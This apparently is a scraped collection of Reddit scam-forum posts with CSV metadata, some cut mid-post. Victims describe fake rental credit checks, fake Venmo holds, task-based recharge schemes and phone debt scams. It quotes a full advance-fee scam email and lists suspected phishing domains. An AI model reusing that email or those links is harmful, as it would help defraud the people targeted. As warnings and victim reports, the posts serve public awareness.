I am in my early 20s and this is the first time I’m doing this process on my own, so I won’t lie I will probably look really stupid in explaining this. I also apologize for my poor formatting, as I don’t use reddit enough to understand how to make posts look good. Either way, PLEASE help me. I am so scared.


For the past few months, I’ve been trying to get an apartment. I don’t exactly have any credit (that’s an even longer story), so it has been a little hard for me to land a place. A month ago, as I was looking around on Zillow, I found a place that looked good and like the many others I sent them a tour request.

The “owner”, a person who called their self “Sofie”,  wrote back to me in this fashion: (See image labeled as “1”)

After that text, they told me they wanted to send me a link to check my credit. I gave them my email, to which they send me a link that, after crossing over a few URLs, took me to a transunion page where I filled out my info such as name, address, last 4 social digits, birthday, etc. 
(See images “2.” And “3.”)

I tried to explain that I didn’t have any credit, and they said they wanted to see my credit score anyway. I assumed it was to make sure I wasn’t lying in order to hide bad credit or something. 

I got my credit score (which was literally blank because I don’t have credit), sent them a screen shot, and they stopped responding to me. 


A month later, I’m still looking for rentals when I find another place. I shoot them a tour request, and they text me. I get a text from the same number as “Sofie” but this time they are calling their self “Genna”. I thought this was from a Zillow number or something like that, so I engaged for a minute. It wasn’t long before I realized that “Genna” texted exactly the same as “Sofie”. (See image “4.”)


I realized quickly that this was some kind of scam, and that’s where the panic set in which is what has brought me here to reddit. I once again got an email from “Genna”, who in the same stylings as “Sofie”, send me the same trans union link to check my credit score. 
(See Image “5.”) 

I took note of all of the URLS that the link crossed over to bring me to the trans union page to post them here for analysis. 
(see images “6.” to “8.”)

The URLS are
your-creditscore.com
afflat3a1.com
transunion.ifgza3.net 
then it takes me to the actual page with the credit report form.

I quickly went back to the link that “Sofie” had sent me, and when I clicked on it this came up:
(see image “9.”)



So, with all of that being said, I am here to ask if I had filled out a fake trans union form a month ago for “Sofie”? Could they have actually seen all of the sensitive info I had put down? I did have to register and pay a fee, which I do now get official emails from trans union as a result. Is there some way I could find out if my SSN or other aspects of my identity have been compromised? 

Someone please help me, I have such little knowledge when it comes to these kinds of things. If more info is needed, I will happily provide it. DMs are open too. I would be extremely grateful for any and all comments, I really need advice here.",Scams,3352,655,77,1

He had initially deposited 1 Bitcoin under the false belief that Cloudbet operated legally in our country due to deception through email correspondences and chat interactions. However he then found out about their true offshore, illegal nature of their operation.

When he sought a refund for his deposits upon discovering the truth, Cloudbet promptly closed his account and refused further communication. Despite his attempts to contact both Cloudbet and their master license holder, who seems to be involved in the scam, his efforts have been in vain.

Not only have they ignored him, but they have also disregarded the involvement of alternate dispute resolution moderators like LCB.org and Casinomeister, who tried to assist. He even provided certified medical documents from his general practitioner and psychiatrist to emphasize the profound impact on his mental health, yet Cloudbet remains unresponsive.

The hotel said they never received payment, and called the police.

The boyfriend said he didn’t have enough funds to actually pay for the hotel, because his card was already maxed out. 
He had emails of a confirmation and receipts showing the funds withdrawn.

I recently had my car stolen, it was recovered by the police, and I went to the impound lot to pick up my things before towing it to a mechanic.

She has some trouble proving the car is hers or something and had to get more papers out of her friends car or something (her friend thanked me for not making a big deal out of the line thing here)

anyways, she's signing some forms and I go ahead and get everything done inside, then go wait outside to be taken to my car

## the (possible) scam?
as I'm waiting, she comes out and asks me to show my license and drive her car out. I was confused and she wasn't really communicating very clearly, so I wasnt sure why she couldn't drive it out, but I didn't sense any red flags so I did it.

Only as I was leaving did I think, that was kinda weird, did I mess up? I had to sign something to drive the car out, but I didn't read it (I also had to sign something to see my car but I also didn't read that (I know I shouldn't do that, but I felt rushed))

Is there some kind of fraud (""it wasn't broken like this until you drove it!"") kind of thing I could be in danger of? or could there have been a reason she couldn't drive it out?

I paid 140usd to the dealer through PayPal(friends and family). The next day he gave me a link to the package tracking website and a tracking number. 

Soon I get three calls and a message via text (1st photo). I responded asking how to pay–assuming it would be through the website. He sent me a PayPal address and told me to send through family and friends and send a screen shot that I’ve sent it. I was suspicious but did so anyway after he was calling and texting how he was waiting on payment and “time is running”. 

The next morning I receive the following message (2nd&3rd photo). 

I (exasperatedly) ask if it’s the same PayPal account and proceed to receive a new PayPal address for which the receiving end is in PLN? (I was confused as I was to believe this whole tracking website is American, why am I paying PLN?) 

He is pressuring me to send the money… That time was running–calling me several times, messaging me “??” And “hello sir.” Over and over. I told him I was at work and that I would do it on break. He didn’t like that answer and said it was urgent I do it then. 
(My card was declining sending the money so I made a new PayPal acc and used a different card) 
I sent the money to a new American address because it didn’t work with the first PayPal acc/my card, and told him I would have to call to get it sorted; hence the new address. 

Today I received a message from him with the tracking website I was sent previously and my tracking number. He told me to track the package. I went on the website to track and was faced with another money ask. (See photo 4)

I told him I received the tracking number and all after he messaged me and called me a few times waiting on my response. I told him I had seen it and he followed up with (photo 5). 

At this point I’m almost 100% sure this is a scam and I’m not sending him any more money. When I sent the first message (photo 6) I got a call immediately from him and promptly after a message from the man I had bought it off of. He was asking if everything was cool now (I had told him the situation and he said 3 other of his buyers had the same issue but it was all resolved and i just had to “be cool and everything will be sorted out”). I did not respond to him. 

I sent the second text (seen in photo 6) and as you can see, received that response…

1697329298.0,Advice Please: Friend's family is being torn apart/possibly evicted over scamming,"Hey, I'm posting for a friend of mine who doesn't know what else to do. Their family is being torn apart over an active scam  (or worse) and may cause them to lose their home.

Her 70+ year old parents are the center of the problem. The dad is actively sending scammers money, totaling over $100k. This has gone on over an undetermined period. Essentially, he's claimed to have stopped but has actually kept sending them money and has stopped paying the family bills. They have no heat, internet and face a housing court hearing at the end of the month.

I'm trying to find some solutions for the mom as the dad seems so far down the rabbithole that he's convinced he isn't being scammed (or he's doing something more nefarious but I can't guarantee anything). In either case, she needs help and doesn't deserve this. But she's so out of the loop on the family finances that she's just watching the family funds bleed away as her husband gives money to these scammers.

Does anyone have any tips for them? So far we've tried legal aid (they live in the US) but they earn too much to qualify. We're looking into domestic abuse centers under financial and mental abuse claims. I've also floated the idea of her telling the judge everything at court but I fear that won't help her much. With the funds depleted, the mom can't afford a new place to rent or even file papers to divorce him.

Can anyone help? Any advice would be massively appreciated.

1697328594.0,Two Scams You Should Know,"The first scam that came my way almost got me and the second was highly convincing. Both are not the norm. 

First off, I’d like to point out the obvious: the abundance of scammers are calling or texting outside of the US and we are used to them calling us from Kolkata and/or sending photos of Asian women. So when the scammers call within the US, without an accent and pose as extremely hard nosed sounding lawyers or employers, don’t let your brain go into autopilot response mode. 

The first one came when I was applying for work and at a time I just wanted to do something part time and manual labor, so cleaning sounded like a great part time gig to get moving and I also find it relaxing (calming my mind). I thought I had signed up for a cleaning company recruiting new hires to work for their team. The guy who called me must have been training someone as there were two of them (not on the phone at the same time but I could hear another man asking questions and being referred to.)

He was extremely slick and got me talking when I was in a good mood. I was trying to get the details of the job, and he was doing great with making it sound like what I was looking for. While I was asking him for information, he was asking me for my information, address etc. This conversation ended up wasting over an hour 1/2 of time as he wasn’t being clear on his responses and I was genuinely trying to get to the bottom of EXACTLY what the job entailed. I FINALLY got it out of him, that it wasn’t for a company, that I was supposed to sign up my services for their REFFERAL service, and supply my own equipment and products. The guy never stopped talking and continued to get what areas I could provide for, what exact services I could supply—-this was before I could find out it was a referral service btw. I continued to think about it. If I wanted to supply my own items. “MY NAME”, he said, I just need your SSN# to complete the form!” I reply on autopilot 55$-0$- fii—-wait a second, I’m not going to give you my social security number over the phone when I still haven’t decided if I even want to do this.”

Yes but we just need the last four of your social to get started. 

Mm hmm. So this isn’t with a company. This is just me. And you don’t offer anything except to ADVERTISE my services correct? Because you haven’t exactly been forthcoming. 

Sigh. That is correct now I just need the last four of your social. 

I know you want the last four but you don’t *need* it because that isn’t how this works. You need to extend an offer of employment and I need to fill out the forms to be eligible. 

I just need th—-

And I’m not going to give it to you. 

Just the last four—-

Aaaand I’m not going to give it to you. 

Now I’m going into fuck with the guy just to see how long will he keep going bc I’m ticked at myself for almost giving it to him. It turned out he was entirely willing to go for at least the next 30 minutes which became extremely comical and elevated in our back and forth which would take up too much space to go into here. 

“You can do a legitimate intake hiring process for freelance work and send me the I-9 forms in the mail if you aren’t going to do it in person. You’re fucking with someone with 20 years of freelance experience” didn’t even stop him, it was ridiculous!

We literally went back and forth with an “am not”, “am too”! Type of exchange that went on and on. Except it was “I just need the last four.” “And I’m not going to give it to you.” For 30 more minutes. He really thought he could force it out of me bc he got a taste, even though I went cold. I couldn’t believe how long he went on with his boner, trying to impress his little friend or trying to wear me down? 

It finally ended with my saying I’m more than willing to continue to waste your time. I have nothing else to do today. But he continued and it didn’t really stop until someone else came over and I put him on speaker and yelled “Can you believe this fuckhead is trying to get my social security number over the phone!? I’m the dipsht who almost gave it to him and now he thinks if he repeats it 100x I’m magically going to give in! Lolll!” At which point he thanked me and got off the phone. 

Never ever do what I almost did! Job Scammers!

Scam two was crazy!

A man claiming to be a process server called my mom asking if we would be home because she was being *sued* and when could he come over to her house to serve her for court proceedings over unpaid credit card debt. He sounded completely legitimate. My mom was extremely upset because he was saying she had unpaid back debt going back to 2007, and her house was being put on lien. (Everything was on speaker-phone.)

I took the phone. Excuse me this is her daughter could you please repeat what it is? He repeats it and says he’s just the process server and doesn’t know anything about anything, he just wants to know if we’ll be home so he can serve us. He gives me an 888 number to call the lawyers. I do so. Half ring and a man picks up sounding exactly like the first guy who starts spewing legal terminology at me. Excuse me I say, but can you please cut the legalese and speak plainly? He is sounding annoyed JUST LIKE a lawyer whose time I was wasting. “I can’t respond with the exact terms with respect to my client’s anonymity.“ 
“Oh ok. So you are saying that she owes $16,000 from over 20 years ago in credit card debt but you can’t tell me who or what?”

That’s correct and she’s been sent several pieces of mail and hasn’t responded yack yack yack further legalese and she should take it up with her lawyer, and begins to say something about a $5,000 lower payment option. 

“I tell you what, you go ahead and send us the exact debts and the breakdown of what these charges are EXACTLY and we’ll go from there. Go on ahead and send the process server but until you send a copy of the breakdown for the *exact* charges, we won’t be proceeding with anything.” He gets off the phone. 

I can’t call the process server back because he called from an unknown number. 

She’s ticked and scared. We look up how long they can continue to collect credit card debt. I think it said 7 years. 

Then I realized, not only do we both think it sounded like the exact same dude, how did the lawyer know to answer the phone with my name when I called back when I didn’t give it to him yet? He answered rt away: “How can I help you Ms Name?”

Unsurprisingly, no process server showed up. 

Always remember: these people need to send you a breakdown of charges via federal mail. Which they had never done because that would bring Federal charges if they try to scam you that way. 

They are trying to sound scary to old people with buzz words: debt. Sued. Lawyer. Process server. Coming to your home. Juuust to get that “initial payment.”

Process servers are not allowed to call you to find out when you will be home either.",Scams,6901,1323,118,1

1697321715.0,Wondering what the explanation is behind these fraudulent charges,"I logged into my bank account today and saw I had 6 identical $12 credits to my bank account from Transcend CPAP. Scrolled a little further and saw that on Oct 10th I had 6 $12 debits from the same place. 

I've never heard of this place--they seem to be a small CPAP business based in MN--nor have I ever bought a CPAP machine. And I live in NYC. 

I'm on the phone now to lock down my bank account but I'm thing to figure out what kind of fraud this even is. If someone managed to steal my bank account, why 12 charges to some random CPAP small business across the country, and why the refunds 3 days later, and why not start buying other stuff meanwhile. So confused. 

I'm struggling to even understand how they got my account number. I lost my wallet and debit card a few weeks ago, but I immediately closed all my cards and have a brand new debit card with a brand new #. There was no information about my bank account number in there. So either my bank account # got leaked elsewhere, or my _new_ debit card number has been stolen in the last 2 weeks since getting it. I don't use my debt card or bank account for anything but bills.

1697321056.0,Christmas Time Scams Online,"It happens every year now. I thought it was my bad decision making when I would purchase from a seller from a online auction who never shipped the item. I  had to wait to get my money back. Sometimes that wait could be 3 plus weeks long  at a time that I needed my money for the Holiday season. 

Now I am seeing that it has become a regular scam mostly right before the month of Thanksgiving or Christmas.

Crooked sellers will list desirable items for sale at good price with a extended shipping time frame and when they get a buyer and payment is made they never ship the item. Keep in mind the buyer  can not open a resolution case for a refund for not receiving the item until after the shipping time frame has passed.

 So if the seller has been given a 15 day time frame to ship/delivery of the item the buyer can not open a case with the auction site until after that time has passed. Once the case is open it takes about 7 days plus before the auction site will give back the money from the seller and several more days for the money to reach your bank account.  In all it could be a 30 day or more process at a time of year when you really need your money.

 How it this a scam?. The sellers usually gets paid your money right away for the item and uses it. With the intent on never sending the item. The seller can spend the money any way they wish without ever shipping the item. Who needs payday loans with auction polices like this.

 I know these companies are aware of what is happening but do nothing about it.

What can the companies do about it? Require the item be shipped with tracking before they release the payment to the seller and if the seller does not send the correct item hold them responsible for return shipping cost.  Or dont release payment until the item has been delivered. That would help.",Scams,1826,348,21,1

1697307235.0,Facebook becoming overwhelmed with scams - infuriating & unusable,"I help run the social media accounts for a public school where I work. We have a decent sized following on Facebook, where many of our parents and community members get important info, but over the last couple years the spam, malicious links, and scamming nonsense has just gotten worse and worse. I have tried to turn on moderation tools, but every time I find something that I think works, the scammers find a work around within a few weeks. It's so frustrating because we really use our page to help disseminate information and a lot of older parents/guardians and grandparents just aren't tech-savvy enough to not click the obvious spam links. I feel like I'm spending way too much time trying to outsmart these bad actors and it's exhausting.  Some examples of what I'm seeing:

Every day we have a sporting event (which is 3-4 days per week), multiple pages with legitimate looking names will tag my school's page or list my page as co-hosts for an event. The post/description looks like it's a livestream of our games (correct date, time, location, school names and mascots), but it's not our link. They aren't associated with us in any way and I know it's probably some malicious site that steals your info. I always block and report but they just make new pages. 

Then they started commenting on our posts, even posts that had nothing to do with athletics. Same BS: legitimate date, time, location, and team names with mascots, but completely scammy link. There would be like 10 of them on every post. I got fed up and when into the page moderation settings and turned on comment moderation based on keywords, because I noticed patterns in the words and links used. That caused all the scam comments to be auto-hidden, and for the last month I've been relatively happy with that situation. At least is prevents vulnerable people from seeing it. 

Then, this week, the spam pages got smart again. They started leaving comments like ""Way to go!"" and ""So Exciting!!"", which sounded normal and went un-flagged. Then, TWO DAYS LATER they edited their comment to contain the scam athletic information with the bad links. The auto-moderation didn't catch it. I was so frustrated! How could it be worth their time to play the long game like this? 

I know Facebook has much bigger problems then just the public school pages getting hit by these scammers. On my personal account, they keep recommending me reels and images of stolen content. Webcomics with the original artist cropped out and reposted without permission. Reels from whole accounts whose entire page is just reposted videos from the exact same person, with a name nearly identical to the original creator. I try to report and block but nothing happens because ""you have to be the copyright holder to submit a copyright infringement claim"". Then sometimes the original creator can't even get the stolen content taken down!

I'm even seeing these scammers start to post stuff in the ""Reviews"" section of the pages, including the one I run. The reviews are ""Positive"" but the content of the review has nothing to do with the actual page.

How can Facebook be so bad at managing all of this? Their safeguards are so terrible it's almost like they have nothing in place at all. I wish I could just throw away their whole app but it's part of my job 😭

I think their business model doesn’t work anymore and they’re not able to generate income because if this guy is so rich, why is he not able to pay back at least one YouTube channel if it’s not working . I would not invest your money into this. These guys appear to be scam artist with the usual.

1697303960.0,Instagram/snapchat hack,"Hi Everyone,

It looks like someone got into my email that then got access to snapchat/instagram/linkedin and a few others.

I got access back to all my accounts but cannot change my email password for 30days so looks like they still have access until then.

On instagram they posted some Crypto scam things to my story and used my account to try to speak with my friends to sign up to the scam.

On Snapchat, looks like they might have saved a bunch of intimate photos from years ago of myself but also ex-partners (all above 18). But also they basically just deleted all my contacts on snapchat, which I found a bit strange. 

But I am curious about what they will do with these photos. If they try to ask for money, I will obviously refuse. But they have not contacted me yet. Also, what else would they do with the photos? Sell them?

Thanks!",Scams,846,156,16,1
1697303801.0,Freewebsiteguys 1 star review,"I recently engaged with [**The Free Website Guys**](https://thefreewebsiteguys.com/). for website development services, and unfortunately, my experience has been less than satisfactory. Despite my initial excitement and eagerness to get my website up and running, the reality has been disappointing. Its not really free so I trusted them.

From the outset, we agreed on specific timelines for the project, but unfortunately, those were not adhered to. Even after allowing for some flexibility and granting extensions, the project remains significantly delayed, causing a substantial disruption to my business plans and expectations.

Communication throughout this process has been lacking, leaving me in the dark about the progress and status of my website. It's disheartening to feel like my concerns were not taken seriously, and updates were infrequent and inadequate.

While I initially had trust in the capabilities of them, the prolonged delay and lack of transparency have raised doubts about their reliability and professionalism. I had hoped for a smoother and more efficient experience, but unfortunately, that has not been the case.

I would encourage them to seriously reflect on their project management and communication processes to ensure they can meet their commitments and provide a more satisfactory experience for their customers in the future. As a customer, I value clear communication and timely delivery, aspects that were lacking in this engagement.

In conclusion, I would caution potential clients to thoroughly evaluate their ability to adhere to timelines and maintain open and effective communication before engaging their services.",Scams,1662,245,32,1

This seller is extremely stupid and used her real FB and e-transfer email. Long story short, I ended up messaging her mom who told me she's a horrible person and that she does this all the time and also steals from stores and that they don't talk. Her mom told me she's called the police on her multiple times but they said they can only do something if the call came from one of her victims. The mom gave me the seller's phone number and address and told me to contact the police. 

I'm wondering if calling the police would actually do anything since it's such a small amount? I would ideally like my money back, but if that's not possible, I'd like to do something to stop this girl from doing this in the future! It's just not right.

Contact point to HR via Snapchat and later invite to Telegram for a mastermind group.

Login, create account on  https://www.world-edreamsodigeo.com with referral code and complete sets of reviews processing. .8% commission on a reviewed package, with random chances of Expedited Packages at 6%. Expedited packages however debit standing balance, requiring a recharge. Payment are via crypto though interac is available at higher tiers after recharge amounts are reached (which also increase the commision percent to 2.5%). Payment is completed via a chat with customer service and screen shot of recharge, which returns account balance to positive to proceed, with higher commission added to new total. This new total then sets the available price on the next package in line additively.
After completing all sets, training account is withdrawn and 18% of earned commissions transfered to a personal account. Complete sets and recharge for personal account and withdrawal to crypto wallet. First day was 170 USD, no issues.

In group chat, totals seem to range from 1500 balances to over 5000, with commissions between 1 to likely 3% of total. Account cannot be withdrawn till all packages are completed no refund or reset potential by customer service.

Not sure if this or something like it has existed and shown as a scam before, seems that the company is real, and has a low review rating and poor customer refund experiences, though other travelers us the company offerings legitimately.

In my case, I was hit with 7 EP, debiting higher and higher amount required to recharge, which subsequently added higher travel packages and EPs, for even higher packages and EP. Currently way over my head with money tied up, and the last EP requires 6000 USD. Group chat notes just powering through.

Unknown why after pressing customer service, my account is not just deleted and a gotcha runs across screen. Customer service is prompt and engageable, and seemingly legit after initial withdrawals. No signs or notes of the job online, but also no reference to it being a scam. Others seem to have no issue withdrawing, and personal messages with group members reflect this.

If anyone can weigh in, it seems like a bait and switch to escalate from small to larger amounts and hard to get any info on it.

1697293437.0,The Semi-Innocuous Travel Scam,"Was in India several years ago. Cab drivers compete for western tourists (or anyone they think has money I guess)....

We talked to a guy by all the cabs in a transportation hub in Mumbai... Thought he was a driver but he found somebody else for us after talking a few minutes.

We just wanted someone to take us to a few places / sites over a few hours. Had also lost some luggage and needed to find a place to buy some clothes. The cab driver agreed. Idk if they did it intentionally, but a lot of the drivers and people spoke English and the guy we ended up with didn't speak English very well at all. I think they wanted something like $10 for him to drive us for about 3-4 hours time. 

So... We take off and this driver proceeds to take us to several high end art and clothing business in the area. The first few we obliged and walked around the stores. The stuff was all comparable to basically shopping in Paris or New York ritzy areas.... We didn't have the money for anything like that, but I told my wife I figured the driver was getting kickbacks to take us to certain places.

I'm pointing to places on maps and saying names of places I know he's familiar with and he seems to get it... Then we end up somewhere else not on the agenda.

After about 2 hours it became clear the driver was only going to take us to places he wanted to go and we paid the guy $15 or so for the time and had him drop us off. He seemed surprised.

Thing is, I would have paid the guy $50-100 as a tip on top of the $10 for driving us to see what we actually wanted to see. The stuff in the stores he took us to was waaay out of our range, but $50-100 for a few hours of driving and waiting would have been very reasonable in my opinion.

Most of the time we were on foot or in the little golf cart cabs that fill the streets honking incessantly at other cars while completely ignoring the 2 ton longhorn in the middle of the road with the 6' horn span. We weren't dressed up nice. I guess they just thought since we came to India from the US we had money. We really just got to go because a friend got us 90% off on the flight. (On a side note about misconceptions about westerners... Shared a train cab between Mumbai and Agra with a local who was baffled that I'm from the US but don't personally know Will Smith, lol).

It didn't really cost us much but a few hours, and we learned a bit about how things work with cabs in the cities in some places.

And you gain money by commission and its usually very low between 10-35 cents per task.
Everyday you have 3 sets of orders and each set has 40 tasks. 
There are things called ( super orders). 
It is a product that you earn 50× the commission of the normal product.

When you encounter one your balance will be in minus and you cannot proceed until you deposit money to get your balance to 0 then submit the super product. 
After you do the deposit and get your balance to 0 you will submit the super product and all the money you deposited will be back to your on screen balance.

1697251133.0,FB Marketplace Venmo Scam,"Looking for some quick advice, if anyone went through something similar and what measures you guys took to feel somewhat at ease. I was selling a couch on marketplace and suddenly had 2 potential buyers. It was for a vintage couch and photos looked like older users who might actually be interested, they started a bidding war. One buyer finally won and asked for the usual meetup area and meetup agreement. I mentioned cash only, but said since it’s family picking up they can pay now through venmo. They ask for my username, then they mention since they are sending payment through venmo business account they need my email and that there would be a payment hold to verify that I am the correct recipient. I get an email and the email looks similar to other venmo emails I have received. I click the “Amount on Hold” button in the email, and it takes me to the Venmo App, which initially makes me think it was legit, but I realized it kept asking me to send referrals an invite to Venmo, after a 2nd attempt at the link, same thing, referral page. Then I realize, “oh no, is this a scam?!” I check my email and view the sender, it’s not the typical venmo email and seems like a spam/scam email made up on the fly. I immediately shut off my wifi and turn on airplane mode, then I turn off my device and restart. Should I be concerned? Is it safer to assume I should reset my iPhone completely?

Aside from the obviously suspect premise, it is always the same person calling me but the phone number and area code is different each time.

I asked the caller once to explain how it works. He said that his company works as a third party with various utility providers across North America, and receive commissions for bringing them new customers. Here’s the funny part - they get paid their commissions in the form of vouchers and gift cards that the company cannot use for anything other than making utility payments. So their offer is - “let us pay your bills. Confirm that your bill has been paid. Then pay us 60% of the billed amount.”

Their persistence is annoying, and my guess is that there’s a play to steal personal info or perhaps pay the bill using some fraudulent means that will end up failing to settle and return to me with fines after I have paid them the 60%.",Scams,1064,198,13,1

Went to send the money to my gf for food ( yes this money was for food to feed us tonight) and it popped up and said the transaction was declined by my bank. To me this meant that this person either did a glitch and its popping up in my balance but i dont really have it and its declining bc cashapp is trying to take it from my bank card. Or they used a stolen credit card to send it and i cant use the money. BOTTOM LINE I LEARNED MY LESSON WITH WHY THEY SAY DO CASH ONLY when using fb i thought that meant for not sending cashapps over the app before receiving the product i didnt know that meant for this i only did cashapp bc i have no car and had to send the money to my gf to get the food bc shes catching a ride to the store then here so she cant make trips to get the cash from me then do everything else bc her ride has stuff to do. 

Summary: it was $70 btw
- Sold smth on fb marketplace 
- Person checked out item 
- I typed in my cashapp 
- I received the typical cashapp notification 
- Along with the email one i always get 
- I also got the text notification abt the money also always get this
- I checked in my app it showed up
- Checked the transaction page their face and name popped up with it
- I went to send the same money to someone on cashapp
- It said my transaction was declined by my bank

What i think happened:
- They used a stolen credit card to send so i cant use it or its a glitch

What looks off  & where i went wrong:
- I didn’t technically see them send it to me i typed it and i saw them click confirm to send but thats it 
- It took a while to pop up on my balance 
- it has a (+) sign beside the amount they sent but other money i received doesn’t have that on my transaction list
- They did look shady but i dont judge people",Scams,2187,454,9,1

When I visited the link, it was an Australia post website (or fake one). The website was also secure, but scammers are getting smarter. 

It was asking me to edit my address.

The thing is I have 2 parcels currently in transit, when I checked the tracking neither had been suspended (unless it hasn't updated). I purchased from Ebay, and hadn't changed my default address saved on there. I checked the shipping details anyways, and the address was correct! which would mean it was the sellers mistake if this is true.

1697237798.0,Pretty sure I'm being scammed?," So,  this whole thing started last Sunday when a company tried to take a  very large amount of money out of my account. I was alerted by chase  fraud, I cancelled my card right away & now I'm waiting for a new  one.

Not sure how or when this  company or people got my information, but I've noticed around September  18th, last month, I started getting these ""Non-Chase ATM Fees"" Just from  the 18th of last month, to today, I have been charged a total of $45 in  these fees. They're each $3. I called customer service and the guy told  me they are fees that happen when you withdraw or inquire at a  non-chase ATM. The thing is, I only go to the ATM once a month, at the  beginning of the month to pull out cash to pay my bills. Other than  that, I never touch an ATM. But somehow I'm getting these fees every  couple of days. Even 4 in one day. Sadly I'm not being alerted when  these fees happen. I have alerts on for every purchase I make and I  don't get notified from the app when these happen. Since I've cancelled  my card last Sunday, I've received 2 more of these fees just 3 days ago,  on the same day. I noticed when I am charged a legit ATM fee, it says  ""Non-Chase ATM Fee-WITH"" meaning withdraw. But all of these new ones  since September 18th say ""Non-Chase ATM Fee-INQ"" meaning inquiry.

After  looking deeper into my purchases, I just noticed theres a pattern.  These fees seem to happen when I go to my local taco bell, 7/11, and  Chevron. And the 4 fees I had in one day, I believe might be connected  to the vending machine I used at the courthouse when I had jury duty. I  bought 1 drink for $2.65 but I was charged 3 additional times (4 total)  for that one drink, and I had those 4 fees pop up in that same day.

Is  this possibly the work of skimmers? But if so, how would this be linked  to an ATM? And how can I avoid this but still go to the places close to  my house?

&#x200B;

TLDR; I keep getting Non-Chase ATM Fees for inquiry even though I NEVER go to the ATM to check my balance. I go to the ATM once a month to pull out money for my bills. I notice it happens when I go to my local taco bell, 7/11, and Chevron. Is this the work of card skimmers?",Scams,2183,428,63,1

I reached out to support to ask if they can get it unlocked but they lied to me about GSM stuff. However, it was actually locked by Verizon because the original owner of the phone had not paid for their phone bill. I verified this by contacting verizon with the IMEI number.
Anyway, BackMarket told me to bring back the phone which I did but then couldn’t acknowledge receipt of the phone. They started throwing me in circles as they told me to contact the courier. Nevertheless, they then said they will open an investigation with the seller and follow up with documentation to open a case with the courier if necessary . I waited for 2 weeks then I contacted them expecting to get feedback concerning a refund or replacement but they told me that they didn’t do the investigation and they weren’t going to. Personally, I am done with them because I cannot trust them with my hard earned money. It’s $454 but for a college student who is working 2 jobs to pay for college and support my family it makes a huge difference.

I was so excited about a potential job opportunity they presented, but things quickly took a turn for the worse. They asked me to pay fees upfront, promising it was for background checks and administrative costs. Also made me sign a document that said “If job is not provided within a week the money will be refunded”. So it made me trust them because there’s an agreement. But after I paid, they never sent me any message like they promised and when I looked up the company all the reviews showed that it was a scam. 

It’s my mistake because in the interview email they didn’t mention the company name only the address but after I went and paid and did the whole “part 1” of the interview that’s when I got to know the name of the recruitment company. It was such a disappointing and frustrating situation.

I have their exact address and everything but reading reviews made me realize that police can’t do anything as they are a legit licensed company since 2006 and the only way to do something is to go to court but I don’t have the resources for that. They seemed so legit because their office was located in a well known bank building and so many other things made them seem legit. Any idea what I can do?

1697217290.0,Guy getting scammed out of his house while trying to scam poor people out of theirs?,"This guy who likes to tell everyone his business at my gym appears to be getting scammed. He recently started going to seminars to start his own “business” where he finds people who can’t afford their existing mortgage, has them transfer it into a trust that he owns, he pays their mortgage monthly, they make payments to him over a period of time longer than their mortgage, then he will transfer the house back to them. So his business will be losing money until the mortgage is paid off, then it’d make money for the 5 or 10 additional years of payments he collects. He’s adamant that he’s helping people who can’t afford their homes or get a loan from the bank, but it seems pretty clear the way you make money on this is by waiting until someone misses a payment, then evicting them and keeping their house. I find this to be an immoral business, but I think I understand it.

Where things get confusing are when this guy starts talking about trusts. He is making a trust to put these houses into, so that the transfer of the house is allegedly not considered a sale. But he is then talking about how he needs to make sure his name, or his families names, are not on the trust so that it can’t be tracked back to him “for legal protection”. He will also be creating a second trust to put his house and cars into, which will also not have his name on it. We are having trouble getting information from him on what legal protection he thinks this is protecting himself against and why he needs this, but he just says vague things about banks and lawyers coming after him, potentially from his business pretending these homes are not being sold, or in case someone gets hurt in one of these houses and tries to sue him. He is currently in the process of putting the trust with his home and cars under the name of his pastor and the other trust under the name of someone he met at these seminars. He’s also talking about getting his drivers license address changed to “a suite” so that his bank accounts associated with the trusts don’t have his address on them. Said something about a law passed after 9-11. 

Has anyone seen something like this before? It feels like he’s being taught to try to scam poor people while being set up as a mark himself. We’ve told him we think this is immoral and sketchy, but he’s pushing through. 

Note: all this info is just the best I can gather from this guy going on about this. He’s not answering direct questions about it very clearly so I’m not sure if some of this is wrong or I’m missing something here.",Scams,2548,475,35,1

'coremed' was the one i chose after seeing a inspiring podcast message about how they treated them like a family etc etc ...

So the first thing I did was to contact them and have a consultation with a science bro whose job it is to make me feel really positive and like it's really affordable, he basically said to me here's everything you will need, the trt the estrogen blockers and the pills that keep your testicles healthy and full and then rounded it off by saying the whole thing would be $299 with an additional 50 bucks per month for the medication, sounds doable right?

Well, after I had my blood work done and had my consultation with the nurse and got my recommendations via an email I had another conversation with him where he said sorry for the confusion of which there was none, he claimed the $50 a month was actually $50 a week, then from there ended the phone call and said I will send you an email with the full spec of everything you need, with the pricing next to it.. lo and behold, everything had a price next to it of around $375 there were at least six different things of which you needed three to move forward, it turned out to be even with just a hormone replacement therapy starter kit which is supposed to only be for 10 weeks and boost your trt levels,.. 308 bucks a week!! For 10 weeks... so $299 to walk in the door and then $308 all set and told for 10 weeks and this isn't even mentioning the vitamin deficiencies I had vitamin D Etc when I live in Florida which I found very odd... so you can expect to spend about 3 Grand on a starter kit for hormone replacement therapy and unless you're very wealthy I wouldn't even attempt trt as that's pretty much for life, so the reality is if you make less than 100 Grand a year you're pretty much not going to be able to afford it in the long run.",Scams,2046,393,47,1

Hello there,
My name is Kristina, and I'm emailing you about the 2004 Toyota Corolla CE  ( PRICE $800 shipping included ) , gasoline engine, automatic transmission and only 138,237 miles. The engine 1.8L - V4, runs very well and the automatic transmission shifts perfectly. Has a clean and clear title in my name and there are no liens or loans on it. This car was used by my husband who died 4 month ago. The price was reduced at $800 because I'm in a hurry to find a buyer. I need to sell the car before the 15 of next month, when I will be leaving on military duty with my medical team out of the country for a year and do not want to store it. 

Right now I'm on a military base, we are training, getting ready to leave the country. The delivery process will be managed by me. I think I can have it there at your home address within 2-3 working days. It will come with a clear title. I am a member of the eBay buyer protection program and using this service you will get a 5 days testing period after delivery. During that 5 days testing period I will not be getting any money. 

I need to know if you are interested so I can ask eBay to send you the details on this deal. If interested please include in your next email your contact info for eBay ( full name, full shipping address and phone number, so we can get the ball rolling ). 
I hope to hear from you very soon. I attached some pictures Below.

1697176564.0,Dad getting scammed? Can't remember by who or how,"Okay so, my mom passed away about five years ago and I (29M) have been helping my dad (63M) raise my special needs brothers ever since, they're teens now but not remotely independent. My Dad lives off of disability money and a state issued stipend for one of my brothers due to his special needs.

